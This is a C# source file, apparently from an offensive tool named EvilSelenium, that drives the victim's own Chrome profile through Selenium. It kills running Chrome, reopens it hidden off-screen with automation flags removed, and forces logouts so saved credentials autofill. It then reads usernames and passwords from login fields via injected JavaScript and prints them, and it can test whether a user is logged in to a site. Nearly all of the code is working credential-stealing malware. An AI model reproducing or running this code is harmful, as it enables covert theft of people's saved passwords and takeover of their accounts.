using System;
using System.Diagnostics;
using System.Text;
using OpenQA.Selenium;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Chrome;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;

namespace EvilSelenium.Misc
{

    /* Generic helper functions */
    class Helpers
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);

        [DllImport("User32.dll", SetLastError = true)]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static void purgeChrome()
        {
            Process[] chromeInstances = Process.GetProcessesByName("chrome");
            foreach (Process p in chromeInstances)
                p.Kill();

        }

        public static IWebDriver InitDriver()
        {
            // Get current username
            StringBuilder Buffer = new StringBuilder(64);
            int nSize = 64;
            GetUserName(Buffer, ref nSize);

            // Kill Chrome
            purgeChrome();

            // Initialize the chromedriver
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            service.SuppressInitialDiagnosticInformation = true;
            ChromeOptions options = new ChromeOptions();

            options.AddArgument(@"user-data-dir=C:\Users\" + Buffer.ToString() + @"\AppData\Local\Google\Chrome\User Data");
            options.AddArgument("log-level=3");
            options.AddArgument("window-position=5000,1000");
            options.AddExcludedArgument("enable-logging");
            options.AddExcludedArgument("enable-automation");   

            IWebDriver driver = new ChromeDriver(service, options);
            return driver;

        }

        /*
         * Delete the cookies to logout of website
         * string loginUrl - The login page of the target website (e.g. https://example.com/login)
         */
        public static IWebDriver CookieDeleter(string loginUrl)
        {
            IWebDriver driver = null;

            try
            {
                driver = InitDriver();
            }
            catch (WebDriverArgumentException ex)
            {
                Console.WriteLine("[-] Existing Chrome processes should first be purged.");
                Environment.Exit(-1);

            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error initializing driver: " + ex);
                Environment.Exit(-1);
            }

            // Head to website
            driver.Navigate().GoToUrl(loginUrl); // Will automatically redirect to homepage if authenticated
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);


            // Sign out & refresh page
            driver.Manage().Cookies.DeleteAllCookies();
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

            // Head back to the login page
            driver.Navigate().GoToUrl(loginUrl);
            driver.Navigate().Refresh();
            Thread.Sleep(2000); // Wait for page to load, increase if necessary

            return driver;

        }

        /*
         * Some websites don't logout when Cookies are deleted
         * this function can logout by traversing to a specific link instead
         * string logoutLink - the logout endpoint link
         * */
        public static IWebDriver LogoutUsingLink(string logoutLink)
        {
            IWebDriver driver = InitDriver();

            // Logout
            driver.Navigate().GoToUrl(logoutLink);
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

            return driver;
        }

        /*
         * Extracts the username and password given the id of the input boxes.
         * string targetWebsite - The login page of the targetWebsite
         * string usernameId - The id of the username input box
         * string passwordId - The id of the password input box
         * IWebDriver driver - The chrome driver
         */
        public static void ExtractUserPassById(string targetWebsite, string usernameId, string passwordId, IWebDriver driver)
        {
            // Extract passwords
            IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
            try
            {
                driver.FindElement(By.Id(usernameId)).Click();
            }
            catch (NoSuchElementException ex)
            {
                Console.WriteLine("[-] Error - The element name was not found");
                return;
            }
            catch(ElementClickInterceptedException ex)
            {
                // Theres another element blocking it
                // Use Actions class to get past this error
                Actions act = new Actions(driver);
                act.MoveToElement(driver.FindElement(By.Id(usernameId))).Click().Perform();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error - Check the provided arguments are correct");
                return;
            }

            try { 
            string username = (string)js.ExecuteScript("return document.getElementById('" + usernameId + "').value");
            string password = (string)js.ExecuteScript("return document.getElementById('" + passwordId + "').value");

            Console.WriteLine("----- " + targetWebsite + " -----");
            Console.WriteLine("Username: " + username);
            Console.WriteLine("Password: " + password);
            Console.WriteLine();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unable to execute the JS. Element ID probably wrong.");
                return;
            }

        }

        /*
         * Extracts the username and password given the name of the input boxes.
         * IMPORTANT: ASSUMES IT'S THE FIRST ELEMENT.
         * string targetWebsite - The login page of the targetWebsite
         * string usernameId - The name value of the username input box
         * string passwordId - The name value of the password input box
         * IWebDriver driver - The chrome driver
         */
        public static void ExtractUserPassByName(string targetWebsite, string usernameId, string passwordId, IWebDriver driver)
        {
            // Extract passwords
            IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
            try
            {
                driver.FindElement(By.Name(usernameId)).Click();
            }
            catch (NoSuchElementException ex)
            {
                Console.WriteLine("[-] Error - The element name was not found");
                return;
            }
            catch (ElementClickInterceptedException ex)
            {
                // Theres another element blocking it
                // Use Actions class to get past this error
                Actions act = new Actions(driver);
                act.MoveToElement(driver.FindElement(By.Name(usernameId))).Click().Perform();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error - Check the provided arguments are correct");
                return;
            }

            try { 
            string username = (string)js.ExecuteScript("return document.getElementsByName('" + usernameId + "')[0].value");
            string password = (string)js.ExecuteScript("return document.getElementsByName('" + passwordId + "')[0].value");

            Console.WriteLine("----- " + targetWebsite + " -----");
            Console.WriteLine("Username: " + username);
            Console.WriteLine("Password: " + password);
            Console.WriteLine();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unable to execute the JS. Element name probably wrong.");
                return;
            }


        }

        /*
         * Extracts the username and password given the name of the input boxes and their position.
         * This function is used if the name is value is not unique
         * string targetWebsite - The login page of the targetWebsite
         * string usernameIdPostion - the position of the name value e.g. document.getelementsbyname("value")[x]
         * string passwordIdPostion - the position of the name value e.g. document.getelementsbyname("value")[x]
         * string usernameId - The name value of the username input box
         * string passwordId - The name value of the password input box
         * IWebDriver driver - The chrome driver
         */
        public static void ExtractUserPassByNameCustom(string targetWebsite, string usernameIdPosition, string passwordIdPosition,
            string usernameId, string passwordId, IWebDriver driver)
        {
            // Extract passwords
            IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
            try
            {
                driver.FindElements(By.Name("username"))[Int32.Parse(usernameIdPosition)].Click();
            }
            catch (NoSuchElementException ex)
            {
                Console.WriteLine("[-] Error - The element is not clickable");
                return;

            }
            catch (ElementClickInterceptedException ex)
            { 
                // Theres another element blocking it
                // Use Actions class to get past this error
                Actions act = new Actions(driver);
                act.MoveToElement(driver.FindElement(By.Name(usernameId))).Click().Perform();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error - Check the provided arguments are correct");
                return;
            }
            try
            {
                string username = (string)js.ExecuteScript("return document.getElementsByName('" + usernameId + "')[" + usernameIdPosition + "].value");
                string password = (string)js.ExecuteScript("return document.getElementsByName('" + passwordId + "')[" + passwordIdPosition + "].value");

                Console.WriteLine("----- " + targetWebsite + " -----");
                Console.WriteLine("Username: " + username);
                Console.WriteLine("Password: " + password);
                Console.WriteLine();

            } catch(Exception ex)
            {
                Console.WriteLine("[-] Unable to execute the JS. Element name probably wrong.");
                return;
            }

        }

        /* Checks if the user is authenticated to a given website
         * string website - The website to check
         * string targetId - ID of an element that is only available for authenticated users
         */
        public static bool IsUserAuth(string website, string targetId)
        {
            
            IWebDriver driver = Helpers.InitDriver();
            driver.Navigate().GoToUrl(website);
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

            IJavaScriptExecutor js = (IJavaScriptExecutor)driver;

            try
            {
                driver.FindElement(By.Id(targetId));
            }
            catch (ElementClickInterceptedException ex)
            {
                // Try to see if the element is blocked by something
                Actions act = new Actions(driver);
                act.MoveToElement(driver.FindElement(By.Id(targetId)));

            }
            catch (NoSuchElementException ex)
            {
                Console.WriteLine("[-] Element not found. If it's the correct ID then user is unauthenticated");
                return false;
            }
            

            return true;
        }

        public static string VerifyPath(string saveToPath)
        {
            string newPath = saveToPath.TrimEnd('\\');

            if (!Directory.Exists(newPath))
            {
                Console.WriteLine("[-] Invalid path specified");
                System.Environment.Exit(-1);
            }

            return newPath;

        }
    }
}
